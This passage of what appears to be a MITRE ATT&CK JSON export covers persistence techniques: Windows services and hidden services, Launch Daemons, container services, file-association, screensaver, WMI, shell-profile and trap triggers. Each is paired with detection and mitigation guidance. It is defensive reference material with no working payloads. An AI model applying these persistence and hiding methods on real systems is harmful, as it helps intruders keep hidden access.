<a href=\"https://technet.microsoft.com/en-us/library/cc772408.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Services)</a> Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: <code>.sys</code>) to disk, the payload can be loaded and registered via Native API functions such as <code>CreateServiceW()</code> (or manually via functions such as <code>ZwLoadDriver()</code> and <code>ZwSetValueKey()</code>), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as <code>PnPUtil.exe</code>. <a href=\"https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec W.32 Stuxnet Dossier)</a> <a href=\"https://www.crowdstrike.com/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike DriveSlayer February 2022)</a> <a href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a> Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a> <a href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a>\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., Hide Artifacts), for example by using the <code>sc sdset</code> command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as <code>Get-Service</code>, <code>sc query</code>, and <code>services.exe</code>. <a href=\"https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS 1)</a> <a href=\"https://www.sans.org/blog/defense-spotlight-finding-hidden-windows-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS 2)</a>","detection":"Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 <a href=\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 4697 APR 2017)</a> <a href=\"https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Event Forwarding FEB 2018)</a>). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Process: Process Creation","Network Traffic: Network Traffic Flow","Service: Service Creation","Command: Command Execution","File: File Metadata","Windows Registry: Windows Registry Key Creation","Driver: Driver Load","Service: Service Modification","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."},{"id":"M1028","name":"Operating System Configuration","description":"Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. <a href=\"https://www.microsoft.com/security/blog/2021/12/08/improve-kernel-security-with-the-new-microsoft-vulnerable-and-malicious-driver-reporting-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Driver Reporting Center)</a> On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed service drivers. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft driver block rules)</a>"},{"id":"M1045","name":"Code Signing","description":"Enforce registration and execution of only legitimately signed service drivers where possible."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."}]},{"id":"T1543.004","name":"Launch Daemon","description":"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> <a href=\"https://www.real-world-systems.com/docs/launchdPlist.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: launchd Keywords for plists)</a>\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions. <a href=\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WireLurker)</a> <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a>\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files. <a href=\"https://bradleyjkemp.dev/post/launchdaemon-hijacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LaunchDaemon Hijacking)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a>","detection":"Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.\n\nSome legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present. <a href=\"https://www.real-world-systems.com/docs/launchdPlist.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: launchd Keywords for plists)</a>","platforms":["macOS"],"dataSources":["Process: Process Creation","File: File Creation","File: File Modification","Service: Service Modification","Command: Command Execution","Service: Service Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting folder permissions abuse opportunities on systems, especially reviewing changes made to folders by third-party software."}]},{"id":"T1543.005","name":"Container Service","description":"Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the <code>docker run</code> or <code>podman run</code> command with the <code>restart=always</code> directive, a container can be configured to persistently restart on the host. <a href=\"https://blog.aquasec.com/teamtnt-reemerged-with-new-aggressive-cloud-campaign\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AquaSec TeamTNT 2023)</a> A user with access to the (rootful) docker command may also be able to escalate their privileges on the host. <a href=\"https://gtfobins.github.io/gtfobins/docker/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFOBins Docker)</a>\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. <a href=\"https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Attack 2023)</a> <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes DaemonSet)</a> Pods can also be deployed to specific nodes using the <code>nodeSelector</code> or <code>nodeName</code> fields in the pod spec. <a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Assigning Pods to Nodes)</a> <a href=\"https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppSecco Kubernetes Namespace Breakout 2020)</a>\n\nNote that containers can also be configured to run as Systemd Services. <a href=\"https://www.redhat.com/sysadmin/podman-run-pods-systemd-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Podman Systemd)</a> <a href=\"https://docs.docker.com/config/containers/start-containers-automatically/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Systemd)</a>","detection":"","platforms":["Containers"],"dataSources":["Command: Command Execution","Container: Container Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit access to utilities such as docker to only users who have a legitimate need, especially if using docker in rootful mode. In Kubernetes environments, only grant privileges to deploy pods to users that require it."},{"id":"M1054","name":"Software Configuration","description":"Where possible, consider enforcing the use of container services in rootless mode to limit the possibility of privilege escalation or malicious effects on the host running the container."}]}]},{"id":"T1546","name":"Event Triggered Execution","description":"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events. <a href=\"https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Backdooring an AWS account)</a> <a href=\"https://www.varonis.com/blog/power-automate-data-exfiltration\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis Power Automate Data Exfiltration)</a> <a href=\"https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DART Case Report 001)</a>\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Persistence on OS X)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: amnesia malware)</a>\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.","detection":"Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Linux","macOS","Windows","SaaS","IaaS","Office Suite"],"dataSources":["Module: Module Load","WMI: WMI Creation","File: File Metadata","File: File Creation","File: File Modification","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Cloud Service: Cloud Service Modification","Process: Process Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root."},{"id":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk."}],"subTechniques":[{"id":"T1546.001","name":"Change Default File Association","description":"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. <a href=\"https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Change Default Programs)</a> <a href=\"http://msdn.microsoft.com/en-us/library/bb166549.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Handlers)</a> <a href=\"https://docs.microsoft.com/windows-server/administration/windows-commands/assoc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Assoc Oct 2017)</a> Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. <a href=\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro TROJ-FAKEAV OCT 2012)</a>","detection":"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1546.002","name":"Screensaver","description":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. <a href=\"https://en.wikipedia.org/wiki/Screensaver\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Screensaver)</a> The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Gazer Aug 2017)</a>","detection":"Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Block .scr files from being executed from non-standard locations."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Use Group Policy to disable screensavers if they are unnecessary. <a href=\"https://technet.microsoft.com/library/cc938799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Screensaver GP)</a>"}]},{"id":"T1546.003","name":"Windows Management Instrumentation Event Subscription","description":"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime. <a href=\"https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2015)</a>\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI SANS 2015)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a> Adversaries may also compile WMI scripts – using <code>mofcomp.exe</code>  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. <a href=\"https://www.secureworks.com/blog/wmi-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell WMI Persistence)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MOF May 2018)</a>\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.","detection":"Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> <a href=\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting WMI Persistence)</a> Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created. <a href=\"https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Hunting for Persistence Part 1)</a>\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> PowerShell cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process). <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Register-WmiEvent)</a>","platforms":["Windows"],"dataSources":["File: File Creation","Process: Process Creation","Command: Command Execution","WMI: WMI Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI."},{"id":"M1026","name":"Privileged Account Management","description":"Prevent credential overlap across systems of administrator and privileged accounts. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent malware from abusing WMI to attain persistence. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}]},{"id":"T1546.004","name":"Unix Shell Configuration Modification","description":"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. <a href=\"https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: intezer-kaiji-malware)</a> <a href=\"https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: bencane blog bashrc)</a> These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely. <a href=\"https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-rocke-tactics)</a> <a href=\"https://wiki.archlinux.org/index.php/Bash#Invocation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux manual bash invocation)</a> Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. <a href=\"https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tsunami)</a> <a href=\"https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-rocke-tactics)</a> <a href=\"https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: anomali-linux-rabbit)</a> <a href=\"https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Magento)</a> Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. <a href=\"https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ScriptingOSX zsh)</a> <a href=\"https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PersistentJXA_leopitt)</a> <a href=\"https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: code_persistence_zsh)</a> <a href=\"https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS MS office sandbox escape)</a> The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.","detection":"While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\nMonitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files. <a href=\"https://objective-see.com/blog/blog_0x48.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESF_filemonitor)</a> \n\nFor most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.","platforms":["Linux","macOS"],"dataSources":["Process: Process Creation","File: File Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence."}]},{"id":"T1546.005","name":"Trap","description":"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received. <a href=\"https://ss64.com/bash/trap.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trap Manual)</a> <a href=\"https://bash.cyberciti.biz/guide/Trap_statement\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyberciti Trap Statements)</a>","detection":"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","platforms":["macOS","Linux"],"dataSources":["File: File Creation","Process: Process Creation","Command: Command Execution","File: File Modification"],"mitigations":[]},{"id":"T1546.006","name":"LC_LOAD_DYLIB Addition","description":"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. <a 